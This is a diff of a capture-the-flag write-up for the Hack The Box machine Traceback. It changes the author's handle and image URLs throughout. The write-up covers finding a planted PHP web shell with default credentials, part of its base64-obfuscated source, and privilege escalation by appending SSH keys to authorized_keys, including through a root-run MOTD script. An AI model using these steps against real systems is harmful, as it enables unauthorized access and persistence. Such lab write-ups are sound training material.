@@ -9,6 +9,7 @@ avatar: assets/htb/traceback.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Traceback
 ---
+
 ## Overview
 
 Traceback is an easy difficulty Linux machine that gives a good introduction to web shells and tracing the steps of how an attacker compromised a server \(then defaced it!\).  
@@ -20,7 +21,7 @@ Traceback is an easy difficulty Linux machine that gives a good introduction to 
 I started off my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, `-oN <name>` saves the output with a filename of `<name>`.
 
 ```text
-zweilos@kali:~/htb/traceback$ nmap -p- -sC -sV -oN traceback.nmap <YOUR_IP>
+kac0@kali:~/htb/traceback$ nmap -p- -sC -sV -oN traceback.nmap <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:39 EDT
 Nmap scan report for <YOUR_IP>
 Host is up (0.048s latency).
@@ -55,7 +56,7 @@ I wasn't able to login, but I noticed a banner saying that the system had been o
 
 ### HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-21_16-48-34%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-21_16-48-34%2520%25281%2529.png)
 
 Connecting to port 80 through a web browser gave me a very similar message. It also said something about a backdoor, so I fired up `gobuster` to see if I could find any other pages since there were no other hints or ways to progress.  
 
@@ -69,15 +70,15 @@ Unfortunately this did not get me anywhere, as the connection was blocked and I 
 
 Next I tried a web search for `FREE INTERNETZZZ`, which led me to Twitter of all places.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/free-internetzzzz.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/free-internetzzzz.png)
 
 "Pretty interesting collection of webshells:"  says the [author](https://twitter.com/RiftWhiteHat/status/1237311680276647936) of this machine...and posted around the same time as the release \(14 Mar 2020 - See [info card](traceback-write-up.md#overview)\).  This felt a lot like an OSINT-type challenge to me.   Clicking on the post led to a collection of "Some of the best web shells that you might need" at [https://github.com/TheBinitGhimire/Web-Shells](https://github.com/TheBinitGhimire/Web-Shells).
 
 I didn't know which web shell was used, and the hint left by `Xh4H` only led to a GitHub repository with a collection of shells. I downloaded them all and started poking through the code to see if anything looked familiar, but most of it was obfuscated and I couldn't find the phrase `FREE INTERNETZZZ` in any of the files. So, I created a list of the filenames and used `wfuzz` to check to see if any of them had been uploaded to the site. _\(And I hoped that the filename hadn't been changed!\)_
 
 ```bash
-zweilos@kali:~/htb/traceback/webshells$ ls -1 > webshells
-zweilos@kali:~/htb/traceback/webshells$ wfuzz -c -w webshells --sc 200 http://<YOUR_IP>/FUZZ
+kac0@kali:~/htb/traceback/webshells$ ls -1 > webshells
+kac0@kali:~/htb/traceback/webshells$ wfuzz -c -w webshells --sc 200 http://<YOUR_IP>/FUZZ
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 
 ********************************************************
@@ -106,7 +107,7 @@ Requests/sec.: 18.04628
 
 Using `wfuzz` I was able to find the web shell used at `http://<YOUR_IP>/smevk.php`.I navigated to this page and got a login screen.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-22_13-13-58.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-22_13-13-58.png)
 
 I opened the code of the `smevk.php` web shell that I had downloaded earlier and didn't have to search long to find what I was looking for.
 
@@ -149,7 +150,7 @@ eval("?>".(base64_decode($smevk)));
 
 The code came with hard-coded default credentials of `admin:admin`. I tried them out on the login page, and was granted access to the shell page.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-22_13-18-32.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-22_13-18-32.png)
 
 When I first started poking around, clicking on buttons and trying to use the shell to enumerate the system I was getting a bit frustrated.  Nothing seemed to be working.  Below are my original notes:
 
@@ -158,7 +159,7 @@ When I first started poking around, clicking on buttons and trying to use the sh
 For some reason the web shell did not function properly in Firefox.  When I finally got tired of banging my head against the shell trying to find something that worked, I decided to try opening it in Chromium instead...and everything worked!
 
 ```text
-zweilos@kali:~/htb/traceback$ echo 'PD9waHAKCiRkZWZhdWx0X2FjdGlvbiA9ICdGaWxlc01hbic7CkBkZWZpbmUoJ1NFTEZfUEFUSCcsIF9fRklMRV9fKTsKaWYoIHN0cnBvcygkX1NFUlZFUlsn\
+kac0@kali:~/htb/traceback$ echo 'PD9waHAKCiRkZWZhdWx0X2FjdGlvbiA9ICdGaWxlc01hbic7CkBkZWZpbmUoJ1NFTEZfUEFUSCcsIF9fRklMRV9fKTsKaWYoIHN0cnBvcygkX1NFUlZFUlsn\
 SFRUUF9VU0VSX0FHRU5UJ10sJ0dvb2dsZScpICE9PSBmYWxzZSApIHsKICAgIGhlYWRlcignSFRUUC8xLjAgNDA0IE5vdCBGb3VuZCcpOwog\
 ICAgZXhpdDsKfQoKQHNlc3Npb25fc3RhcnQoKTsKQGVycm9yX3JlcG9ydGluZygwKTsKQGluaV9zZXQoJ2Vycm9yX2xvZycsTlVMTCk7CkBp\
 bmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsMCk7CkBpbmlfc2V0KCdsb2dfZXJyb3JzJywwKTsKQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGlt\
@@ -202,9 +203,9 @@ After doing some troubleshooting and looking into the code it seemed as if the w
 
 ## Road to User
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-22_17-41-38.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-22_17-41-38.png)
 
-I noticed that the web shell told me that the username we had control of was `webadmin`, so I decided to try to add my public SSH key to the `.ssh/authorized_keys` file of that user to see if it would let me log in that way. I entered the command `echo "ssh-rsa AAAA<my_public_key> zweilos@kali" >> /home/webadmin/.ssh/authorized_keys` into the `Console` field of the web shell.  _\(Notice the append operator `>>`?  Please be nice to your fellow players and don't overwrite the whole file with `>`!\)_
+I noticed that the web shell told me that the username we had control of was `webadmin`, so I decided to try to add my public SSH key to the `.ssh/authorized_keys` file of that user to see if it would let me log in that way. I entered the command `echo "ssh-rsa AAAA<my_public_key> kac0@kali" >> /home/webadmin/.ssh/authorized_keys` into the `Console` field of the web shell.  _\(Notice the append operator `>>`?  Please be nice to your fellow players and don't overwrite the whole file with `>`!\)_
 
 {% hint style="info" %}
 According to [https://www.ssh.com/ssh/keygen/](https://www.ssh.com/ssh/keygen/) you can also do this remotely from a terminal using**`ssh-copy-id -i ~/.ssh/tatu-key-ecdsa user@host`** but you need to be able to authenticate to the machine already to do this.  
@@ -215,7 +216,7 @@ According to [https://www.ssh.com/ssh/keygen/](https://www.ssh.com/ssh/keygen/) 
 After uploading my public key it was easy to just SSH into the machine using my own private key.
 
 ```text
-zweilos@kali:~/htb/traceback$ ssh webadmin@<YOUR_IP>
+kac0@kali:~/htb/traceback$ ssh webadmin@<YOUR_IP>
 #################################
 -------- OWNED BY XH4H  ---------
 - I guess stuff could have been configured better ^^ -
@@ -283,7 +284,7 @@ true    'exit'  0
 luvit  user.txt
 true    'exit'  0
 > os.execute("cat " .. "/home/sysadmin/user.txt")
-6e0b****1419
+6e0b************************1419
 true    'exit'  0
 ```
 
@@ -292,13 +293,13 @@ true    'exit'  0
 While reading up on how to execute commands in this `luvit` shell, I came across this page [https://simion.com/info/calling\_external\_programs.html](https://simion.com/info/calling_external_programs.html) which described a way to execute commands that were more complex than a simple "command" .. "argument" format.
 
 ```text
-> os.execute 'echo "ssh-rsa AAAA<my_public_key> zweilos@kali" >> /home/sysadmin/.ssh/authorized_keys'
+> os.execute 'echo "ssh-rsa AAAA<my_public_key> kac0@kali" >> /home/sysadmin/.ssh/authorized_keys'
 ```
 
 I used this to once again copy my public SSH key to the new user, and used SSH to login.
 
 ```text
-zweilos@kali:~/htb/traceback$ ssh sysadmin@<YOUR_IP>
+kac0@kali:~/htb/traceback$ ssh sysadmin@<YOUR_IP>
 #################################
 -------- OWNED BY XH4H  ---------
 - I guess stuff could have been configured better ^^ -
@@ -396,7 +397,7 @@ The file `00-header`seem to have been edited already by `Xh4H` when he defaced t
 According to the `ps` output, every 30 secs a cronjob copies the backups from `/var/backups/.update-motd.d/` to `/etc/update-motd.d/`. This was the window I had to edit the file and get it to execute to initiate my exploit before the backup wiped my progress. I decided to go for broke and simply use the same privilege escalation method I had already been using. 
 
 ```text
-sysadmin@traceback:/etc/update-motd.d$ echo 'echo "ssh-rsa AAAA<my_public_key> zweilos@kali" >> /root/.ssh/authorized_keys' >> 00-header
+sysadmin@traceback:/etc/update-motd.d$ echo 'echo "ssh-rsa AAAA<my_public_key> kac0@kali" >> /root/.ssh/authorized_keys' >> 00-header
 ```
 
 I copied the same `echo` command I had used to escalate privileges to the previous two users, and echoed it into the MOTD file `00-header`. I set it to copy my public SSH key to the `authorized_keys` file, this time in the `/root/.ssh/` folder. 
@@ -404,7 +405,7 @@ I copied the same `echo` command I had used to escalate privileges to the previo
 In order to execute my command, I needed to run the MOTD program. Since this program is automatically run upon login, I simply logged out, connected back to the `sysadmin` user through SSH, then logged out again, then logged in as `root`.
 
 ```text
-zweilos@kali:~/htb/traceback$ ssh root@<YOUR_IP>
+kac0@kali:~/htb/traceback$ ssh root@<YOUR_IP>
 #################################
 -------- OWNED BY XH4H  ---------
 - I guess stuff could have been configured better ^^ -
@@ -426,5 +427,5 @@ Of course I couldn't forget to collect my hard-earned proof!
 
 ```text
 root@traceback:~# cat root.txt 
-459b****cfa7
+459b************************cfa7
 ```
